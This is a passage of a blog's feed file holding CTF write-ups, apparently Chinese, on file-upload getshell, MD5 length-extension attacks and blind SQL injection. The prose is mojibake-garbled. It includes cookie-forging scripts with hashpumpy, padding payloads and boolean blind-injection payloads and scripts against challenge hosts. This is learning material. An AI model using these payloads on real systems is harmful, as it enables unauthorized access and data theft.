æ‰€ä»¥è¿™é‡Œå¯ä»¥å–å‡ºæ•°æ®æ¥ ç„¶åå°±æ˜¯ç¬¬äºŒå…³çš„ä¸Šä¼ äº† ä¸Šä¼ é‚£é‡Œæœ€å‘çš„æ˜¯backupç›®å½•æ˜¯ä¸ªå‡ç›®å½•,æ‰€ä»¥ç”¨../ä¼šè·³ä¸€å±‚,è¿™é‡Œæµ‹è¯•äº†ä¸€ä¸‹(å› ä¸ºæˆ‘èœå•Š..),æ˜¯å¯ä»¥å¾—åˆ°æ‰§è¡Œçš„,æ¯”å¦‚ <img src="/images/2018/01/7.png" alt="blacsheep" /> å³ä½¿å‡ç›®å½•ä¸å­˜åœ¨,ä¼šè·³ä¸€ä¸‹è¿˜æ˜¯å¯ä»¥å†™å…¥æ–‡ä»¶çš„,ç„¶åå°±æ˜¯æ­£åˆ™åŒ¹é…,æ­£åˆ™åŒ¹é…æ€»æ˜¯åŒ¹é…æœ€åä¸€ä¸ª,æ‰€ä»¥æœ€åæˆ‘ä»¬ç”¨ä¸€ä¸ªè§£ææ¼æ´,ä¼ ä¸€ä¸ª123.php/. ç„¶ågetshell,æ‹¿åˆ°flag okok,å‰©ä¸‹çš„å†…å®¹å‡ ä¹æ¯ä¸€ä¸ªéƒ½å¯ä»¥å†™ä¸€ç¯‡åšå®¢äº†.....æ…¢æ…¢æ•´ç†å§....</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>md5é•¿åº¦æ‰©å±•æ”»å‡»</title>
      <link href="/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2017/12/10/md5%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>ä¸Šå­¦æœŸæœ¬æ¥çœ‹è¿‡ä¸€äº›é•¿åº¦æ‰©å±•æ”»å‡»çš„ä¸œè¥¿çš„,ä½†æ˜¯æ—¶é—´è¿‡äº†å¤ªä¹…äº†éƒ½å¿˜å¾—å·®ä¸å¤šäº†.è¿‘æœŸåˆ·é¢˜æ°å¥½åˆåˆ·åˆ°ä¸€é“md5é•¿åº¦æ‰©å±•çš„é¢˜,æ­£å¥½æ€»ç»“ä¸€ä¸‹. æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹md5åŠ å¯†æµç¨‹: å‚è€ƒé“¾æ¥:<a href="http://blog.csdn.net/syh_486_007/article/details/51228628">ä¼ é€é—¨</a></p><h3 id="é¦–å…ˆå¯¹é•¿åº¦è¿›è¡Œå¡«å……å’Œåˆ†ç»„">é¦–å…ˆå¯¹é•¿åº¦è¿›è¡Œå¡«å……å’Œåˆ†ç»„</h3><p>å¡«å……æ˜¯æŠŠæ•°æ®å˜æˆ512*N+448ä½çš„å½¢å¼,æ¯”å¦‚å¦‚æœé•¿åº¦å°äº448,é‚£ä¹ˆç›´æ¥è¡¥æˆ448ä½;å¦‚æœé•¿åº¦å¤§äº448ä½å°äº512ä½,å°±è¡¥å……æˆ512+448ä½è¿™ç§ã€‚ <strong>å¡«å……æ–¹æ³•</strong>:åœ¨æ¶ˆæ¯åé¢åŠ ä¸ª1ç„¶åæ— é™è¡¥0,16è¿›åˆ¶å°±æ˜¯è¡¥ä¸ª80ç„¶åæ— é™è¡¥0ç›´åˆ°448ä½ã€‚ å¡«å……å®Œä¹‹åå‰é¢æ¯ç»„512ä½,æœ€åä¸€ç»„448ä½,å³56ä¸ªå­—èŠ‚ã€‚ç¬¬57ä¸ªå­—èŠ‚æ˜¯è¡¥ä½ä¹‹å‰çš„æ¶ˆæ¯é•¿åº¦,åé¢ç»§ç»­è¡¥0ç›´åˆ°64å­—èŠ‚.å°±æ¯”å¦‚ä¸‹å›¾ <img src="/images/2017/12/1.png" /> abcä¸‰ä¸ªå­—æ¯,å³3å­—èŠ‚,24ä½,åå…­è¿›åˆ¶æ˜¯0x18,æ‰€ä»¥å¡«ä¸ª18,åé¢è¡¥0x00.</p><h3 id="ç„¶å">ç„¶å</h3><p>å®Œæˆä¸Šè¿°è¿‡ç¨‹ä¹‹åå°±æ˜¯è·å–ä¸€ä¸ªé“¾å˜é‡,ç„¶åå’Œè¿™ä¸ªé“¾å˜é‡ä¸€èµ·è¿›è¡Œä¸€æ³¢å¤æ‚è¿ç®—(è¿™é‡Œä¸ç®¡) è¿™ä¸ªé“¾å˜é‡ä¸€å¼€å§‹æ˜¯å®šå€¼,åé¢çš„é“¾å˜é‡éƒ½æ˜¯ä¸Šä¸€ä¸ªå—è¿ç®—å¾—åˆ°çš„ç»“æœ.</p><h3 id="æœ€å">æœ€å</h3><p>è·å¾—æœ€åä¸€æ¬¡æ¶ˆæ¯çš„æ‘˜è¦ä¹‹åè¿›è¡Œä¸€ä¸ªé«˜ä½ä½äº’æ¢å³å¯è·å¾—md5ã€‚</p><h2 id="md5é•¿åº¦æ‰©å±•æ”»å‡»">md5é•¿åº¦æ‰©å±•æ”»å‡»</h2><p>md5é•¿åº¦æ‰©å±•æ”»å‡»æ˜¯ä»€ä¹ˆå‘¢?å®ƒçš„å®è´¨å°±æ˜¯æ„é€ æ˜æ–‡æ§åˆ¶åŠ ç›å“ˆå¸Œ,æ¯”å¦‚æˆ‘å‰é¢æ„é€ å’Œå·²ç»è¡¥ä½äº†çš„å—å®Œå…¨ç›¸åŒçš„å—,é‚£ä¹ˆæˆ‘ç¬¬ä¸€éƒ¨åˆ†è·å¾—çš„é“¾å˜é‡å°±æ˜¯ç›¸åŒçš„,å¦‚æœæˆ‘ç”¨è¿™ä¸ªé“¾å˜é‡æ¥åç»­å¤„ç†æˆ‘è‡ªå·±æ·»åŠ çš„å­—ç¬¦ä¸²,é‚£æˆ‘æ˜¯ä¸æ˜¯å°±å¯ä»¥åœ¨ä½ çš„hashåé¢åŠ ä¸œè¥¿äº†. <strong>ä¸¾ä¸ªä¾‹å­</strong>: æœ¬æ¥ä¸€ä¸ªå­—ç¬¦ä¸²<span class="math inline">\(a=&quot;test&quot;,0x74657374 æˆ‘æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²\)</span>str1: 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002000000000000000 å¦‚æœæˆ‘ä»¬çŸ¥é“"test"çš„hashå€¼,é‚£ä¹ˆè¿™ä¸ªéƒ¨åˆ†è®¡ç®—å‡ºæ¥çš„å€¼æˆ‘ä»¬æ˜¯çŸ¥é“çš„,å› ä¸º"test"è¿ç®—çš„æ—¶å€™ä¹Ÿè¦è¡¥ä½ è¡¥ä½çš„æ“ä½œå’Œæˆ‘ä»¬æ‰‹åŠ¨çš„æ“ä½œæ˜¯ä¸€è‡´çš„,æ‰€ä»¥ç»“æœæ˜¯ä¸€æ ·çš„,ä½†æ˜¯ä¸åŒçš„æ˜¯,æˆ‘ä»¬å¯¹å­—ç¬¦ä¸²åé¢åŠ äº†æˆ‘ä»¬è‡ªå·±è¦æ·»åŠ çš„ä¸œè¥¿,æ¯”å¦‚ 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002000000000000000746573748 è¿™ä¸ªæ—¶å€™å­—ç¬¦ä¸²å¤§äº512ä½,æ‰€ä»¥è®¡ç®—çš„æ—¶å€™ä¼šå…ˆè¡¥ä½ä½1024ä½,å¦‚ä¸‹ <span class="math inline">\(str=0x7465737480000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000020000000000000007465737480000 00000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000002002000000000000 è®¡ç®—çš„æ—¶å€™å…ˆç®— 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002000000000000000 å‰é¢è¿™ä¸ªéƒ¨åˆ†çš„é“¾å˜é‡ä¸º: A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 é‚£ä¹ˆåé¢çš„è¿ç®—ç”¨è¿™ä¸ªéƒ¨åˆ†çš„é“¾å˜é‡æ¥è®¡ç®—å³å¯ 0x746573748000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000002002000000000000 é€šè¿‡è¿™ç§æ–¹å¼,å‡å¦‚æˆ‘ä»¬çŸ¥é“md5(\)</span>salt.<span class="math inline">\(msg1)çš„å€¼,çŸ¥é“\)</span>salté•¿åº¦,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è·å¾—md5(<span class="math inline">\(salt.\)</span>msg1.<span class="math inline">\(padding.\)</span>hack_content)çš„å€¼ã€‚ åœ¨ä½¿ç”¨é•¿åº¦æ‰©å±•æ”»å‡»çš„æ—¶å€™å¯ä»¥ä½¿ç”¨hashpumpå·¥å…·,æˆ–è€…æ˜¯pythonçš„hashpumpyåº“(è‡ªè¡Œpipå®‰è£…) ç„¶åæˆ‘ä»¬æœ¬åœ°å®éªŒä¸€ä¸‹(è‡ªè¡Œå»æ‰æ¢è¡Œ,è¿™é‡Œä¸ºäº†ç¾è§‚)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span>=<span class="string">&quot;12345&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;admin&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$secret</span>.<span class="string">&#x27;admin%80%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00P%00%00%00%00%00%00%00newadmin&#x27;</span>)));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœä¸º <img src="/images/2017/12/4.png" /> ç„¶åä½¿ç”¨hashpumpå·¥å…·å¾—åˆ°çš„ç»“æœå¦‚å›¾ <img src="/images/2017/12/3.png" /> æ‰€ä»¥å·¥å…·æ˜¯å¯ä»¥ä¿¡èµ–çš„(hhhh,æµ‹è¯•ä¸€ä¸‹å˜›...) å…·ä½“å¯ä»¥çœ‹ä¸‹é¢ä¸¤é“é¢˜</p><h4 id="ç¬¬ä¸€é¢˜">ç¬¬ä¸€é¢˜</h4><p>å®éªŒå§çš„ä¸€é“é¢˜-è®©æˆ‘è¿›å» <a href="http://ctf5.shiyanbar.com/web/kzhan.php">ä¼ é€é—¨</a> é¦–å…ˆcookieçš„sourceæ”¹æˆ1çœ‹æºç ,ç„¶åå‘ç°è¦è®©cookieçš„getmeinçš„å€¼ä¸ºmd5(salt+username+password) ç„¶è€Œsaltå€¼æˆ‘ä»¬ä¸çŸ¥é“,ç„¶åé¢˜ç›®ç»™å‡ºäº†salté•¿åº¦ä¸º15,å¹¶ä¸”ç»™å‡ºäº†md5(salt+"admin"+"admin"),ä½†æ˜¯è¦æ±‚getmeinä¸èƒ½ä¸ºè¿™ä¸ªå·²ç»ç»™å‡ºçš„hash,æ‰€ä»¥è¿™æ˜¯ä¸€é“éå¸¸ç»å…¸çš„é•¿åº¦æ‰©å±•æ”»å‡»çš„é¢˜ç›®,é€šè¿‡ç»™å‡ºçš„hashå’Œsalté•¿åº¦,æ„é€ å‡ºmd5(salt+å·²çŸ¥å€¼+padding+æ§åˆ¶å€¼). å…·ä½“å·¥å…·ä½¿ç”¨ <img src="/images/2017/12/2.png" /> å…¶ä¸­ç­¾åæ˜¯å·²çŸ¥hash,ç„¶åinputdataæ˜¯åé¢å¯†ç é‚£ä¸ªadmin,é•¿åº¦æ˜¯å‰é¢çš„salt+usernameçš„adminå…±è®¡20 ç„¶åå‡è®¾åŠ ä¸Špadding,ç„¶åè‡ªå·±æ§åˆ¶æ•°æ®ä¸ºblacsheep,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è·å¾—flagäº†. æˆ‘ä»¬çš„usernameå¡«admin,ç„¶åå¯†ç å¡«admin%80%00%00%00%00%00%00%00%00%00%00%00 %00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00 %00%00%00blacsheep cookieçš„getmeinå¡«fd9b223a9c562017f65eaf824f3ca8dd å¦‚å›¾<img src="/images/2017/12/5.png" /></p><h4 id="ç¬¬äºŒé¢˜">ç¬¬äºŒé¢˜</h4><p>Jarvisçš„ä¸€é“é¢˜-flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ é¦–å…ˆindex.php~æºç æ³„æ¼,vim -ræ¢å¤ä¸€ä¸‹ å¾—åˆ°æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web <span class="number">350</span>&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        background:gray;</span><br><span class="line">        text-align:center;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">        <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">        <span class="variable">$salt</span> = </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$role</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line">            <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">&quot;admin&quot;</span> </span><br><span class="line">                &amp;&amp; <span class="variable">$hsh</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$role</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">            <span class="variable">$hsh</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>));</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;hsh&#x27;</span>,<span class="variable">$hsh</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹æºç :é¦–å…ˆcookieé‡Œé¢çš„roleè¦ä¸º"admin"çš„åºåˆ—åŒ–å€¼ è€Œcookieé‡Œé¢çš„hshè¦ä¸ºmd5(salt+"admin"çš„åºåˆ—åŒ–å€¼çš„å€’åº) è€Œç›®å‰æˆ‘ä»¬å·²ç»æœ‰äº†md5(salt+"guest"çš„åºåˆ—åŒ–çš„å€’åº) ä¸è¿‡æˆ‘ä»¬å¹¶ä¸çŸ¥é“saltçš„é•¿åº¦ è¿™é‡Œéœ€è¦æš´åŠ›è·‘ä¸€ä¸‹. æ•´ç†ä¸€ä¸‹æ¡ä»¶ æˆ‘ä»¬å·²çŸ¥æ¡ä»¶ md5(salt+<strong>;"tseug":5:s</strong>)ä¸º3a4727d57463f122833d9e732f94e4e0 è¦æ±‚md5(salt+<strong>;"nimda":5:s</strong>) ä½†å®é™…ä¸Š,ååºåˆ—åŒ–æ˜¯å­˜åœ¨ä¸€ä¸ªå°æ¼æ´çš„,æ¯”å¦‚ <img src="/images/2017/12/6.png" /> ååºåˆ—åŒ–åˆ°åˆ†å·å°±åœæ­¢äº† æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªç”¨æŠŠè‡ªå®šä¹‰æ•°æ®æ”¹æˆ<strong>;"nimda":5:s</strong> æ‰€ä»¥æˆ‘ä»¬å®é™…ä¸Šæ˜¯æ±‚md5(salt+<strong>;"tseug":5:s</strong>+padding+<strong>;"nimda":5:s</strong>) æœ¬æ¥é•¿åº¦æ‰©å±•æ”»å‡»æ”¾åœ¨æœ€åçš„ä¸€æ®µæ•°æ®å› ä¸ºåå‘åˆ°å‰é¢,åˆå› ä¸ºååºåˆ—åŒ–çš„å°æ¼æ´,ç›´æ¥è¿”å›äº†admin ç”±è¿™äº›å°±å¯ä»¥æ‹¿åˆ°flagäº† æ‰€ä»¥æˆ‘ä»¬å†™ä¸ªè„šæœ¬å®éªŒä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    role = &#123;<span class="string">&#x27;role&#x27;</span>:<span class="string">&#x27;s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00</span></span><br><span class="line"><span class="string">%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;hsh&#x27;</span>:hashpumpy.hashpump(<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span>,<span class="string">&#x27;;&quot;tseug&quot;:5:s&#x27;</span>,<span class="string">&#x27;;&quot;nimda&quot;:5:s&#x27;</span>,i)[<span class="number">0</span>]&#125;</span><br><span class="line">    <span class="built_in">print</span>(role)</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span>,cookies=role)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Wel&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œç»“æœ <img src="/images/2017/12/7.png" /> è¿™å°±æ‹¿åˆ°flagäº† <strong>é¿å…md5é•¿åº¦æ‰©å±•æ”»å‡»çš„æ–¹æ³•å°±æ˜¯md5(salt+md5(input))</strong></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥å­¦ä¹ (åŠ mctfå°æ€»ç»“)</title>
      <link href="/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2017/11/28/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E5%8A%A0mctf%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>ä¾›cnssäº¤æµä¼šè¯¾åå­¦ä¹  å‰æ’æé†’!æœ¬æ–‡pythonè„šæœ¬å› ä¸ºç¾è§‚éƒ½æ¢äº†è¡Œ,è‡ªå·±åˆ©ç”¨çš„æ—¶å€™è‡ªè¡Œä¿®æ”¹ é¦–å…ˆæºç ä¸¢äº†github <a href="https://github.com/blacsheep/sql-injection-practice">ä¼ é€é—¨</a> ç›´æ¥æ­£æ–‡</p><h3 id="cnssé‚£é“é¢˜">cnssé‚£é“é¢˜</h3><p>è¯¦æƒ…è§æˆ‘åšå®¢cnssæ‹›æ–°pentestä¸€æ–‡</p><h3 id="cnssç›²æ³¨åˆä½“éªŒ">cnssç›²æ³¨åˆä½“éªŒ</h3><p>é¦–å…ˆç”¨æˆ·åå‡ºè¾“å…¥admin' or '1'='1'# è¿”å›é¡µé¢: <img src="/images/2017/11/cnss-1.png" /> å†åŠ ä¸Šé¡µé¢ä¸ä¼šè¿”å›æ•°æ®åº“çš„å†…å®¹,æ‰€ä»¥è€ƒè™‘ç›²æ³¨(å»¶æ—¶ä¹Ÿå¯ä»¥,ä½†æ˜¯è¿”å›ä¼šä¸å‡†ç¡®,æ¯•ç«Ÿå½±å“å› ç´ å¤š) <strong>é¦–å…ˆ</strong>æˆ‘ä»¬å°è¯•å»çˆ†è¡¨: å¸å·:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select group_concat(table_name) </span><br><span class="line">from information_schema.tables where table_schema=database()),1,1))=48#</span><br></pre></td></tr></table></figure><p>å¯†ç éšæ„ å¦‚æœè¿”å›çš„ä¸ä¸ºå¯†ç é”™è¯¯,å°±è¯´æ˜åé¢çš„è¡¨è¾¾å¼æ˜¯æˆç«‹çš„,ç”±æ­¤åˆ¤æ–­å‡ºç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦,é€šè¿‡æ”¹å˜substr çš„ç¬¬äºŒä¸ªå‚æ•°æ¥è·å–å®Œæ•´è¡¨å,é€šè¿‡æ”¹limitæ¥è·å–å…¶ä»–è¡¨(æˆ–è€…group_concatä¹Ÿå¯ä»¥,è¿™é‡Œç”¨çš„group_concat) ç„¶åè·å¾—è¡¨åcnss,flag,user ç„¶ååŒæ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select group_concat(column_name) </span><br><span class="line">from information_schema.columns where table_name=&quot;flag&quot;),1,1))=48#</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆ—åä¸ºflag æœ€å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or ascii(substr((select flag from flag),1,1))=48#</span><br></pre></td></tr></table></figure><p>è„šæœ¬æ ·ä¾‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">list1=[<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\&#x27; or ascii(substr((select group_concat(table_name) </span></span><br><span class="line"><span class="string">from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema=database()),&#123;num&#125;,1))=&#123;ascii1&#125;#&#x27;</span>.<span class="built_in">format</span>(num=num,ascii1=<span class="built_in">ord</span>(each)),</span><br><span class="line">               <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123321&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#print(data)                       </span></span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://localhost:8080/CNSS/bool.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(each,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span 